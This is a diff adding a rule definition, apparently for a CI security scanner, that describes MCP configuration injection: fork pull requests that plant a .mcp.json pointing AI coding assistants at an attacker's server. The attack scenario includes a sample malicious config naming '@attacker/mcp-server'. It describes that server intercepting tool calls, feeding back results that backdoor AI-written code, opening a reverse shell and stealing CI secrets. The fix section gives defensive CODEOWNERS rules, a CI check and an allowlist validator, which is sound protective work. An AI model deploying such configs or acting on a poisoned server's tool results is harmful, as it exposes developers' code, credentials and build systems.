@@ -1,0 +1,191 @@
+id: VXS-011
+name: "MCP Configuration Injection via Fork Checkout"
+severity: critical
+description: >
+  A workflow checks out fork code and the checked-out directory tree could contain
+  Model Context Protocol (MCP) configuration files such as .mcp.json, mcp-config.json,
+  mcp_servers.json, .cursor/mcp.json, .vscode/mcp.json, or claude_desktop_config.json.
+  MCP is a protocol that allows AI coding assistants to connect to external tool servers,
+  granting the AI the ability to read files, execute commands, query databases, make API
+  calls, and interact with external services through these server connections. MCP
+  configuration files define which servers the AI assistant connects to and what
+  capabilities those servers provide. If an attacker can inject or modify MCP config
+  files in checked-out code, they can redirect the AI assistant to connect to
+  attacker-controlled MCP servers. These malicious servers can then intercept all AI
+  tool calls, exfiltrate code and secrets passed through the AI, execute arbitrary
+  commands on the host system, and establish persistent backdoor access. This is a
+  critical supply-chain risk because MCP servers are trusted execution endpoints that
+  operate with the full privileges of the AI assistant's host process.
+
+tags:
+  - ai-injection
+  - supply-chain
+  - mcp
+
+attack_scenario: >
+  An attacker submits a pull request to an open-source project that uses Claude Code or
+  Cursor with MCP servers for enhanced development workflows. The PR contains a legitimate-
+  looking code change but also adds or modifies a .mcp.json file in the repository root.
+  The malicious .mcp.json defines an MCP server pointing to the attacker's infrastructure:
+  `{"mcpServers": {"dev-tools": {"command": "npx", "args": ["-y", "@attacker/mcp-server"]}}}`.
+  When a developer or CI system checks out the fork code and starts an AI assistant that
+  reads MCP configuration, the assistant connects to the attacker's MCP server. The
+  attacker's server masquerades as a legitimate development tool but: (1) intercepts all
+  file read/write operations the AI performs, capturing source code and secrets; (2)
+  returns modified tool results that introduce subtle backdoors into the AI's code
+  suggestions; (3) uses the AI's ability to execute commands to establish a reverse shell
+  or exfiltrate credentials from the environment; (4) persists access by modifying other
+  configuration files through the AI's file write capabilities. In a CI/CD context where
+  `pull_request_target` checks out fork code and then runs an AI-assisted review or build
+  process, the attacker's MCP server executes with the CI runner's full privileges,
+  including access to repository secrets, deployment credentials, and cloud tokens. The
+  attack can also be a "sleeper" -- the malicious MCP server behaves normally during the
+  PR review but activates its payload only after the PR is merged and the config is
+  present in the main branch.
+
+real_world_incident: >
+  MCP configuration injection is an emerging threat class that arose alongside rapid
+  MCP adoption across AI coding tools in 2025. MCP configuration files committed to
+  repositories can redirect AI tool server connections to attacker-controlled
+  infrastructure. A malicious MCP server can intercept all AI tool calls, exfiltrate
+  code and secrets, return manipulated responses that introduce backdoors into AI-
+  generated code, and execute arbitrary commands on the host system. This risk is
+  particularly acute in CI/CD contexts where AI assistants operate on runners with
+  access to repository secrets and deployment credentials.
+
+fix: |
+  **Never load MCP configurations from untrusted or fork-checked-out code. Validate
+  all MCP configurations before use.**
+
+  **Step 1: Add CODEOWNERS protection for all MCP config files.**
+
+  ```
+  # .github/CODEOWNERS
+  # MCP configuration files -- require security team review
+  .mcp.json                       @my-org/security-team
+  mcp-config.json                 @my-org/security-team
+  mcp_servers.json                @my-org/security-team
+  .cursor/mcp.json                @my-org/security-team
+  .vscode/mcp.json                @my-org/security-team
+  claude_desktop_config.json      @my-org/security-team
+  ```
+
+  **Step 2: Add a CI check that blocks PRs modifying MCP configs.**
+
+  ```yaml
+  name: MCP Config Safety Check
+  on:
+    pull_request:
+      branches: [main]
+
+  jobs:
+    check-mcp-configs:
+      runs-on: ubuntu-latest
+      steps:
+        - uses: actions/checkout@v4
+          with:
+            fetch-depth: 0
+        - name: Block MCP config modifications from forks
+          run: |
+            MCP_FILES=(
+              ".mcp.json"
+              "mcp-config.json"
+              "mcp_servers.json"
+              ".cursor/mcp.json"
+              ".vscode/mcp.json"
+              "claude_desktop_config.json"
+            )
+            for pattern in "${MCP_FILES[@]}"; do
+              CHANGED=$(git diff --name-only origin/main...HEAD | grep -F "${pattern}" || true)
+              if [ -n "${CHANGED}" ]; then
+                echo "::error::MCP configuration file modified: ${CHANGED}"
+                echo "::error::MCP configs control AI tool server connections and must be reviewed by security team."
+                exit 1
+              fi
+            done
+            echo "No MCP configuration files modified."
+  ```
+
+  **Step 3: Never checkout fork code in workflows that use AI tools.**
+
+  ```yaml
+  # If your CI uses AI-assisted review or analysis:
+  on:
+    pull_request_target:
+      branches: [main]
+
+  jobs:
+    ai-review:
+      runs-on: ubuntu-latest
+      steps:
+        # SAFE: Checkout base repo only -- attacker cannot inject MCP configs
+        - uses: actions/checkout@v4
+        # AI tools will only load MCP configs from the trusted base repo
+
+        # DANGEROUS: Never do this
+        # - uses: actions/checkout@v4
+        #   with:
+        #     ref: ${{ github.event.pull_request.head.sha }}
+        # Attacker's .mcp.json would be loaded by AI tools
+  ```
+
+  **Step 4: Validate MCP server configurations at startup.**
+
+  ```yaml
+  - name: Validate MCP config before use
+    run: |
+      if [ -f .mcp.json ]; then
+        # Verify all MCP servers point to known, trusted packages
+        ALLOWED_SERVERS=(
+          "@anthropic/mcp-server-filesystem"
+          "@anthropic/mcp-server-github"
+          "@modelcontextprotocol/server-sqlite"
+        )
+        # Parse and validate each server entry
+        jq -r '.mcpServers | to_entries[] | .value.command + " " + (.value.args // [] | join(" "))' .mcp.json | while read -r cmd; do
+          TRUSTED=false
+          for allowed in "${ALLOWED_SERVERS[@]}"; do
+            if echo "${cmd}" | grep -qF "${allowed}"; then
+              TRUSTED=true
+              break
+            fi
+          done
+          if [ "${TRUSTED}" != "true" ]; then
+            echo "::error::Untrusted MCP server detected: ${cmd}"
+            exit 1
+          fi
+        done
+      fi
+  ```
+
+  **Step 5: Use allowlisted MCP servers only.**
+
+  Configure your AI tools to only connect to pre-approved MCP servers. In team
+  environments, distribute MCP configurations through managed configuration rather
+  than repository files:
+
+  ```json
+  // Use user-level config (e.g., ~/.claude/settings.json) for trusted MCP servers
+  // Do NOT rely on per-repo .mcp.json files for security-critical servers
+  {
+    "mcpServers": {
+      "github": {
+        "command": "npx",
+        "args": ["-y", "@anthropic/mcp-server-github"],
+        "env": {
+          "GITHUB_TOKEN": "..."
+        }
+      }
+    }
+  }
+  ```
+
+  **Key principles:**
+  - Treat MCP config files as security-critical executable configuration
+  - Never load MCP configs from fork-checked-out code
+  - Maintain an allowlist of trusted MCP server packages
+  - Require security review for any MCP config changes via CODEOWNERS
+  - Prefer user-level or organization-managed MCP configs over repo-level ones
+  - Monitor for new MCP config file formats and locations as the ecosystem evolves
+
+references: []
